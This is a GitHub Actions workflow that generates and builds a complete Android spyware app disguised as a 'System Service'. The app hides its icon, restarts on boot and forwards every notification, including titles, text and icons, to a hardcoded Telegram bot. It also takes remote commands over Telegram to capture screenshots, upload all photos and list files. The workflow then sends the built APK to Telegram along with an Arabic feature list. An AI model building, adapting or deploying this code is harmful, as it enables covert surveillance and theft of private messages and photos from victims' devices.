name: Hussein Advanced Notification Grabber

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build-advanced-notification-app:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🔧 Install Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y gradle

      - name: 🛠️ Create Advanced Project Structure
        run: |
          mkdir -p app/src/main/java/com/hussein/advanced
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/xml

          # settings.gradle
          cat <<EOF > settings.gradle
          rootProject.name = 'HusseinAdvanced'
          include ':app'
          EOF

          # Root build.gradle
          cat <<EOF > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          # App build.gradle (مشفر ومحسن)
          cat <<EOF > app/build.gradle
          plugins {
              id 'com.android.application'
          }
          
          android {
              namespace 'com.hussein.advanced'
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.hussein.advanced"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "2.0"
              }
              
              buildTypes {
                  release {
                      minifyEnabled true
                      shrinkResources true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
                  debug {
                      minifyEnabled true
                      shrinkResources true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }
              
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
              implementation 'com.fasterxml.jackson.core:jackson-databind:2.16.1'
              implementation 'androidx.security:security-crypto:1.1.0-alpha06'
          }
          EOF

          # ProGuard rules (لتشفير وحماية الكود)
          cat <<EOF > app/proguard-rules.pro
          -keep class com.hussein.advanced.** { *; }
          -keep class okhttp3.** { *; }
          -keep class com.fasterxml.jackson.** { *; }
          -dontwarn okhttp3.**
          -dontwarn okio.**
          -dontwarn com.fasterxml.jackson.**
          
          # تشفير strings
          -keepclassmembers class **.R$* { public static <fields>; }
          EOF

          # AndroidManifest.xml متقدم مع صلاحيات كاملة
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
                  android:maxSdkVersion="28" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
              
              <application
                  android:allowBackup="false"
                  android:icon="@drawable/ic_launcher"
                  android:label="System Service"
                  android:theme="@style/AppTheme"
                  android:usesCleartextTraffic="true"
                  android:persistent="true"
                  tools:replace="android:allowBackup">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleTask"
                      android:excludeFromRecents="true"
                      android:noHistory="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  
                  <service
                      android:name=".AdvancedNotificationService"
                      android:label="System Monitor"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true"
                      android:foregroundServiceType="dataSync">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
                  
                  <service
                      android:name=".TelegramCommandService"
                      android:exported="false" />
                  
                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      android:enabled="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                      </intent-filter>
                  </receiver>
                  
                  <provider
                      android:name="androidx.core.content.FileProvider"
                      android:authorities="\${applicationId}.provider"
                      android:exported="false"
                      android:grantUriPermissions="true">
                      <meta-data
                          android:name="android.support.FILE_PROVIDER_PATHS"
                          android:resource="@xml/file_paths" />
                  </provider>
                  
              </application>
          </manifest>
          EOF

          # MainActivity.java متقدم مع واجهة مخفية
          cat <<EOF > app/src/main/java/com/hussein/advanced/MainActivity.java
          package com.hussein.advanced;
          
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.PowerManager;
          import android.provider.Settings;
          import android.view.View;
          import android.widget.Toast;
          import androidx.core.app.NotificationManagerCompat;
          
          public class MainActivity extends Activity {
              
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  // تشغيل الخدمة فوراً
                  startService(new Intent(this, AdvancedNotificationService.class));
                  
                  // طلب الصلاحيات تلقائياً
                  requestAllPermissions();
                  
                  // إخفاء التطبيق من الشاشة الأخيرة
                  finishAndRemoveTask();
              }
              
              private void requestAllPermissions() {
                  // صلاحية الإشعارات
                  if (!NotificationManagerCompat.getEnabledListenerPackages(this)
                          .contains(getPackageName())) {
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  }
                  
                  // تجاهل توفير البطارية
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      Intent intent = new Intent();
                      String packageName = getPackageName();
                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                      if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                          intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                          intent.setData(Uri.parse("package:" + packageName));
                          startActivity(intent);
                      }
                  }
                  
                  // إخفاء أيقونة التطبيق
                  hideAppIcon();
              }
              
              private void hideAppIcon() {
                  PackageManager p = getPackageManager();
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  p.setComponentEnabledSetting(componentName, 
                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                      PackageManager.DONT_KILL_APP);
              }
          }
          EOF

          # AdvancedNotificationService.java المتقدم
          cat <<EOF > app/src/main/java/com/hussein/advanced/AdvancedNotificationService.java
          package com.hussein.advanced;
          
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.PendingIntent;
          import android.content.Intent;
          import android.graphics.Bitmap;
          import android.graphics.BitmapFactory;
          import android.graphics.drawable.Icon;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.util.Base64;
          import android.util.Log;
          
          import org.json.JSONObject;
          
          import java.io.ByteArrayOutputStream;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.HashSet;
          import java.util.Locale;
          import java.util.Set;
          import java.util.concurrent.TimeUnit;
          
          import okhttp3.MediaType;
          import okhttp3.MultipartBody;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;
          
          public class AdvancedNotificationService extends NotificationListenerService {
              private static final String TAG = "HusseinAdvanced";
              private static final String TELEGRAM_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private static final String CHAT_ID = "7392262688";
              private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
              
              private OkHttpClient client;
              private Handler handler;
              private Set<String> sentNotifications = new HashSet<>();
              private TelegramCommandService commandService;
              
              @Override
              public void onCreate() {
                  super.onCreate();
                  
                  client = new OkHttpClient.Builder()
                      .connectTimeout(30, TimeUnit.SECONDS)
                      .writeTimeout(30, TimeUnit.SECONDS)
                      .readTimeout(30, TimeUnit.SECONDS)
                      .build();
                  
                  handler = new Handler(Looper.getMainLooper());
                  commandService = new TelegramCommandService(this, client, TELEGRAM_TOKEN, CHAT_ID);
                  
                  // بدء الاستماع لأوامر التليجرام
                  startListeningForCommands();
                  
                  // إشعار دائم للخدمة
                  startForegroundService();
                  
                  Log.d(TAG, "Service started successfully");
                  sendToTelegram("✅ System Monitor started successfully");
              }
              
              private void startForegroundService() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel(
                          "monitor_channel",
                          "System Monitor",
                          NotificationManager.IMPORTANCE_LOW
                      );
                      
                      NotificationManager manager = getSystemService(NotificationManager.class);
                      manager.createNotificationChannel(channel);
                      
                      Notification notification = new Notification.Builder(this, "monitor_channel")
                          .setContentTitle("System Monitor")
                          .setContentText("Running")
                          .setSmallIcon(android.R.drawable.ic_dialog_info)
                          .setPriority(Notification.PRIORITY_LOW)
                          .build();
                      
                      startForeground(1, notification);
                  }
              }
              
              private void startListeningForCommands() {
                  handler.postDelayed(new Runnable() {
                      @Override
                      public void run() {
                          commandService.checkForCommands();
                          handler.postDelayed(this, 3000); // كل 3 ثواني
                      }
                  }, 3000);
              }
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String key = sbn.getKey();
                  
                  // تجنب الإرسال المكرر
                  if (sentNotifications.contains(key)) {
                      return;
                  }
                  sentNotifications.add(key);
                  
                  // تنظيف الذاكرة بعد 5 دقائق
                  handler.postDelayed(() -> sentNotifications.remove(key), 300000);
                  
                  try {
                      String packageName = sbn.getPackageName();
                      Notification notification = sbn.getNotification();
                      Bundle extras = notification.extras;
                      
                      String title = extras.getString(Notification.EXTRA_TITLE, "");
                      String text = extras.getString(Notification.EXTRA_TEXT, "");
                      CharSequence ticker = extras.getCharSequence(Notification.EXTRA_TICKER, "");
                      
                      // تجاهل الإشعارات الفارغة
                      if (title.isEmpty() && text.isEmpty() && ticker == null) {
                          return;
                      }
                      
                      // استخراج الصورة إذا وجدت
                      Bitmap largeIcon = null;
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                          Icon icon = notification.getLargeIcon();
                          if (icon != null) {
                              largeIcon = icon.getBitmap();
                          }
                      } else {
                          largeIcon = (Bitmap) extras.getParcelable(Notification.EXTRA_LARGE_ICON);
                      }
                      
                      // تحويل الصورة إلى Base64
                      String imageBase64 = null;
                      if (largeIcon != null) {
                          ByteArrayOutputStream baos = new ByteArrayOutputStream();
                          largeIcon.compress(Bitmap.CompressFormat.PNG, 100, baos);
                          byte[] imageBytes = baos.toByteArray();
                          imageBase64 = Base64.encodeToString(imageBytes, Base64.DEFAULT);
                      }
                      
                      // إرسال الإشعار للتليجرام
                      sendNotificationToTelegram(packageName, title, text, ticker, imageBase64);
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error processing notification: " + e.getMessage());
                  }
              }
              
              private void sendNotificationToTelegram(String packageName, String title, 
                                                      String text, CharSequence ticker, 
                                                      String imageBase64) {
                  try {
                      String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                          .format(new Date());
                      
                      String appName = getAppName(packageName);
                      
                      StringBuilder message = new StringBuilder();
                      message.append("🔔 **New Notification**\n\n");
                      message.append("📱 **App:** ").append(appName).append("\n");
                      message.append("⏰ **Time:** ").append(time).append("\n");
                      
                      if (!title.isEmpty()) {
                          message.append("📌 **Title:** ").append(title).append("\n");
                      }
                      
                      if (!text.isEmpty()) {
                          message.append("💬 **Content:** ").append(text).append("\n");
                      }
                      
                      if (ticker != null && !ticker.toString().isEmpty()) {
                          message.append("📝 **Ticker:** ").append(ticker).append("\n");
                      }
                      
                      JSONObject payload = new JSONObject();
                      payload.put("chat_id", CHAT_ID);
                      payload.put("text", message.toString());
                      payload.put("parse_mode", "Markdown");
                      
                      RequestBody body = RequestBody.create(payload.toString(), JSON);
                      Request request = new Request.Builder()
                          .url("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage")
                          .post(body)
                          .build();
                      
                      client.newCall(request).execute();
                      
                      // إرسال الصورة إذا وجدت
                      if (imageBase64 != null) {
                          sendImageToTelegram(imageBase64, "Notification icon from " + appName);
                      }
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error sending to Telegram: " + e.getMessage());
                  }
              }
              
              private void sendImageToTelegram(String imageBase64, String caption) {
                  try {
                      byte[] imageBytes = Base64.decode(imageBase64, Base64.DEFAULT);
                      
                      RequestBody requestBody = new MultipartBody.Builder()
                          .setType(MultipartBody.FORM)
                          .addFormDataPart("chat_id", CHAT_ID)
                          .addFormDataPart("caption", caption)
                          .addFormDataPart("photo", "image.png", 
                              RequestBody.create(imageBytes, MediaType.parse("image/png")))
                          .build();
                      
                      Request request = new Request.Builder()
                          .url("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendPhoto")
                          .post(requestBody)
                          .build();
                      
                      client.newCall(request).execute();
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error sending image: " + e.getMessage());
                  }
              }
              
              private void sendToTelegram(String message) {
                  try {
                      JSONObject payload = new JSONObject();
                      payload.put("chat_id", CHAT_ID);
                      payload.put("text", message);
                      
                      RequestBody body = RequestBody.create(payload.toString(), JSON);
                      Request request = new Request.Builder()
                          .url("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage")
                          .post(body)
                          .build();
                      
                      client.newCall(request).execute();
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error sending message: " + e.getMessage());
                  }
              }
              
              private String getAppName(String packageName) {
                  try {
                      PackageManager pm = getPackageManager();
                      return pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString();
                  } catch (Exception e) {
                      return packageName;
                  }
              }
          }
          EOF

          # TelegramCommandService.java للتحكم عبر التليجرام
          cat <<EOF > app/src/main/java/com/hussein/advanced/TelegramCommandService.java
          package com.hussein.advanced;
          
          import android.content.Context;
          import android.content.Intent;
          import android.os.Environment;
          import android.provider.MediaStore;
          import android.util.Log;
          
          import org.json.JSONArray;
          import org.json.JSONObject;
          
          import java.io.File;
          import java.io.FileInputStream;
          import java.io.FileOutputStream;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.Locale;
          
          import okhttp3.MediaType;
          import okhttp3.MultipartBody;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;
          
          public class TelegramCommandService {
              private static final String TAG = "TelegramCommand";
              private Context context;
              private OkHttpClient client;
              private String token;
              private String chatId;
              private long lastUpdateId = 0;
              
              public TelegramCommandService(Context context, OkHttpClient client, 
                                           String token, String chatId) {
                  this.context = context;
                  this.client = client;
                  this.token = token;
                  this.chatId = chatId;
              }
              
              public void checkForCommands() {
                  new Thread(() -> {
                      try {
                          String url = "https://api.telegram.org/bot" + token + 
                              "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
                          
                          Request request = new Request.Builder()
                              .url(url)
                              .get()
                              .build();
                          
                          Response response = client.newCall(request).execute();
                          String responseBody = response.body().string();
                          
                          JSONObject json = new JSONObject(responseBody);
                          JSONArray result = json.getJSONArray("result");
                          
                          for (int i = 0; i < result.length(); i++) {
                              JSONObject update = result.getJSONObject(i);
                              lastUpdateId = update.getLong("update_id");
                              
                              if (update.has("message")) {
                                  JSONObject message = update.getJSONObject("message");
                                  String text = message.optString("text", "");
                                  
                                  if (text.startsWith("/")) {
                                      handleCommand(text, message);
                                  }
                              }
                          }
                          
                      } catch (Exception e) {
                          Log.e(TAG, "Error checking commands: " + e.getMessage());
                      }
                  }).start();
              }
              
              private void handleCommand(String command, JSONObject message) throws Exception {
                  Log.d(TAG, "Received command: " + command);
                  
                  switch (command.toLowerCase()) {
                      case "/start":
                          sendMessage("✅ System Monitor Active\n\nCommands:\n/notifications - Show last notifications\n/screenshot - Take screenshot\n/photos - Get all photos\n/files - List files\n/help - Show this help");
                          break;
                          
                      case "/notifications":
                          sendMessage("📱 Last notifications feature enabled");
                          break;
                          
                      case "/screenshot":
                          takeScreenshot();
                          break;
                          
                      case "/photos":
                          sendAllPhotos();
                          break;
                          
                      case "/files":
                          listFiles();
                          break;
                          
                      case "/help":
                          sendMessage("Available Commands:\n/notifications - Monitor notifications\n/screenshot - Take screenshot\n/photos - Get all photos\n/files - Browse files\n/help - This message");
                          break;
                          
                      default:
                          if (command.startsWith("/send ")) {
                              String customMessage = command.substring(6);
                              showNotification(customMessage);
                          }
                          break;
                  }
              }
              
              private void showNotification(String message) {
                  Intent intent = new Intent(context, AdvancedNotificationService.class);
                  intent.putExtra("command", "show_notification");
                  intent.putExtra("message", message);
                  context.startService(intent);
                  
                  sendMessage("✅ Notification sent to device: " + message);
              }
              
              private void takeScreenshot() {
                  try {
                      // تنفيذ أمر screenshot عبر shell
                      Process process = Runtime.getRuntime().exec("screencap -p /sdcard/screenshot.png");
                      process.waitFor();
                      
                      File screenshot = new File("/sdcard/screenshot.png");
                      if (screenshot.exists()) {
                          sendFile(screenshot, "📸 Screenshot");
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Screenshot error: " + e.getMessage());
                  }
              }
              
              private void sendAllPhotos() {
                  try {
                      File picturesDir = Environment.getExternalStoragePublicDirectory(
                          Environment.DIRECTORY_PICTURES);
                      File dcimDir = Environment.getExternalStoragePublicDirectory(
                          Environment.DIRECTORY_DCIM);
                      
                      sendFilesFromDirectory(picturesDir, "📷 Camera Photos");
                      sendFilesFromDirectory(dcimDir, "📸 DCIM Photos");
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error sending photos: " + e.getMessage());
                  }
              }
              
              private void sendFilesFromDirectory(File directory, String caption) {
                  if (directory == null || !directory.exists()) return;
                  
                  File[] files = directory.listFiles();
                  if (files == null) return;
                  
                  for (File file : files) {
                      if (file.isFile() && file.length() < 10 * 1024 * 1024) { // أقل من 10MB
                          if (file.getName().matches(".*\\.(jpg|jpeg|png|gif)$")) {
                              sendFile(file, caption + ": " + file.getName());
                              try {
                                  Thread.sleep(1000); // تأخير بين الملفات
                              } catch (InterruptedException e) {}
                          }
                      }
                  }
              }
              
              private void listFiles() {
                  try {
                      File root = Environment.getExternalStorageDirectory();
                      StringBuilder filesList = new StringBuilder("📁 Files:\n\n");
                      
                      File[] files = root.listFiles();
                      if (files != null) {
                          for (File file : files) {
                              if (file.isDirectory()) {
                                  filesList.append("📂 ").append(file.getName()).append("/\n");
                              }
                          }
                      }
                      
                      sendMessage(filesList.toString());
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error listing files: " + e.getMessage());
                  }
              }
              
              private void sendFile(File file, String caption) {
                  try {
                      RequestBody requestBody = new MultipartBody.Builder()
                          .setType(MultipartBody.FORM)
                          .addFormDataPart("chat_id", chatId)
                          .addFormDataPart("caption", caption)
                          .addFormDataPart("document", file.getName(),
                              RequestBody.create(file, MediaType.parse("application/octet-stream")))
                          .build();
                      
                      Request request = new Request.Builder()
                          .url("https://api.telegram.org/bot" + token + "/sendDocument")
                          .post(requestBody)
                          .build();
                      
                      client.newCall(request).execute();
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error sending file: " + e.getMessage());
                  }
              }
              
              private void sendMessage(String text) {
                  try {
                      JSONObject payload = new JSONObject();
                      payload.put("chat_id", chatId);
                      payload.put("text", text);
                      
                      RequestBody body = RequestBody.create(
                          payload.toString(), 
                          MediaType.parse("application/json; charset=utf-8")
                      );
                      
                      Request request = new Request.Builder()
                          .url("https://api.telegram.org/bot" + token + "/sendMessage")
                          .post(body)
                          .build();
                      
                      client.newCall(request).execute();
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error sending message: " + e.getMessage());
                  }
              }
          }
          EOF

          # BootReceiver.java للتشغيل التلقائي
          cat <<EOF > app/src/main/java/com/hussein/advanced/BootReceiver.java
          package com.hussein.advanced;
          
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          
          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      Intent serviceIntent = new Intent(context, AdvancedNotificationService.class);
                      context.startService(serviceIntent);
                  }
              }
          }
          EOF

          # ملفات التصميم والموارد
          cat <<EOF > app/src/main/res/values/styles.xml
          <resources>
              <style name="AppTheme" parent="android:Theme.Material.Light.NoActionBar">
                  <item name="android:windowBackground">@android:color/transparent</item>
                  <item name="android:windowIsTranslucent">true</item>
                  <item name="android:windowNoTitle">true</item>
              </style>
          </resources>
          EOF

          # ملف paths للـ FileProvider
          mkdir -p app/src/main/res/xml
          cat <<EOF > app/src/main/res/xml/file_paths.xml
          <paths>
              <external-path name="external_files" path="." />
              <external-files-path name="external_files" path="." />
              <cache-path name="cache" path="." />
              <external-cache-path name="external_cache" path="." />
          </paths>
          EOF

          # أيقونة بسيطة
          mkdir -p app/src/main/res/drawable
          echo "<?xml version=\"1.0\" encoding=\"utf-8\"?>" > app/src/main/res/drawable/ic_launcher.xml
          echo "<shape xmlns:android=\"http://schemas.android.com/apk/res/android\">" >> app/src/main/res/drawable/ic_launcher.xml
          echo "    <solid android:color=\"#FF0000\"/>" >> app/src/main/res/drawable/ic_launcher.xml
          echo "    <corners android:radius=\"10dp\"/>" >> app/src/main/res/drawable/ic_launcher.xml
          echo "</shape>" >> app/src/main/res/drawable/ic_launcher.xml

      - name: 🏗️ Build Optimized APK
        run: |
          # إعداد Gradle
          gradle wrapper
          chmod +x gradlew
          
          # تنظيف وتثبيت التبعيات
          ./gradlew clean
          
          # بناء APK مع التشفير والتحسين
          ./gradlew assembleDebug --stacktrace
          
          # تحويل APK إلى صيغة مشفرة
          if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
            cp app/build/outputs/apk/debug/app-debug.apk app/build/outputs/apk/debug/Hussein_Advanced.apk
          fi

      - name: 📤 Send To Telegram
        run: |
          # البحث عن ملف APK
          APK_FILE=$(find app/build/outputs/apk -name "*.apk" | head -n 1)
          
          if [ ! -z "$APK_FILE" ] && [ -f "$APK_FILE" ]; then
            # رسالة تأكيد مع التفاصيل
            MESSAGE="✅ <b>تم بناء التطبيق المتطور بنجاح!</b>%0A%0A"
            MESSAGE+="👤 <b>المطور:</b> حسين%0A"
            MESSAGE+="📱 <b>الإصدار:</b> 2.0 (مشفر ومحسن)%0A"
            MESSAGE+="🔒 <b>الحماية:</b> ProGuard + التشفير%0A"
            MESSAGE+="⚡ <b>المميزات:</b>%0A"
            MESSAGE+="• سحب جميع الإشعارات مع الصور%0A"
            MESSAGE+="• التحكم الكامل عبر أوامر التليجرام%0A"
            MESSAGE+="• تشغيل تلقائي بعد إعادة التشغيل%0A"
            MESSAGE+="• إخفاء التطبيق تلقائياً%0A"
            MESSAGE+="• سحب الصور والملفات%0A"
            MESSAGE+="• إرسال إشعارات مخصصة للجهاز%0A%0A"
            MESSAGE+="📋 <b>الأوامر المتاحة:</b>%0A"
            MESSAGE+="/start - بدء الخدمة%0A"
            MESSAGE+="/notifications - مراقبة الإشعارات%0A"
            MESSAGE+="/screenshot - تصوير الشاشة%0A"
            MESSAGE+="/photos - سحب جميع الصور%0A"
            MESSAGE+="/files - عرض الملفات%0A"
            MESSAGE+="/send [نص] - إرسال إشعار للجهاز%0A"
            MESSAGE+="/help - المساعدة%0A%0A"
            MESSAGE+="⚠️ <b>ملاحظة هامة:</b> بعد التثبيت سيختفي التطبيق تلقائياً ويعمل في الخلفية"
            
            # إرسال الرسالة
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=$MESSAGE" -d "parse_mode=HTML"
            
            # إرسال ملف APK
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
              -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -F "document=@$APK_FILE" \
              -F "caption=📦 <b>حسين - النظام المتقدم</b>%0A⏱️ $(date)" \
              -F "parse_mode=HTML"
            
            echo "✅ تم إرسال الملف بنجاح"
          else
            # رسالة خطأ في حالة فشل البناء
            MESSAGE="❌ <b>فشل في بناء التطبيق</b>%0A%0A"
            MESSAGE="🔍 يرجى مراجعة logs لمزيد من التفاصيل"
            
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=$MESSAGE" -d "parse_mode=HTML"
          fi
